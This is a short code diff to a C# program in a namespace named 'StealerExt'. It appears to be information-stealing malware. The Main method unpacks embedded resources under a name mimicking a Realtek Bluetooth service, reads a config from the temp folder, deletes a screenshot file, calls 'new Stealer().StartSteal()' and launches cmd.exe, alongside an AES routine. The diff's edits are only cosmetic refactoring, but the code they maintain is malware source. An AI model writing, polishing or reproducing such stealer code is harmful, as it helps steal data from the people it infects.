@@ -9,7 +9,7 @@ using System.Security.Cryptography;
 
 namespace StealerExt
 {
-    internal class Hook
+    internal static class Hook
     {
         [STAThread]
         public static void Main(string[] arg)
@@ -28,7 +28,7 @@ namespace StealerExt
             }
             string[] resName = Assembly.GetExecutingAssembly().GetManifestResourceNames();
             for (int i = 0; i < resName.Length; i++)
-                if (resName[i].ToLower() != "rtkbtmanserv.properties.resources.resources") ExtractResources(resName[i]);
+                if (resName[i].ToLowerInvariant() != "rtkbtmanserv.properties.resources.resources") ExtractResources(resName[i]);
             dynamic config = JsonConvert.DeserializeObject(File.ReadAllText(API.Temp + "config"));
             if (File.Exists(API.Temp + "\\ss.png")) File.Delete(API.Temp + "\\ss.png");
             new Stealer().StartSteal();
@@ -86,7 +86,6 @@ namespace StealerExt
                 FileName = "cmd.exe"
             });
         }
-
         
         public static byte[] AES128(byte[] message)
         {
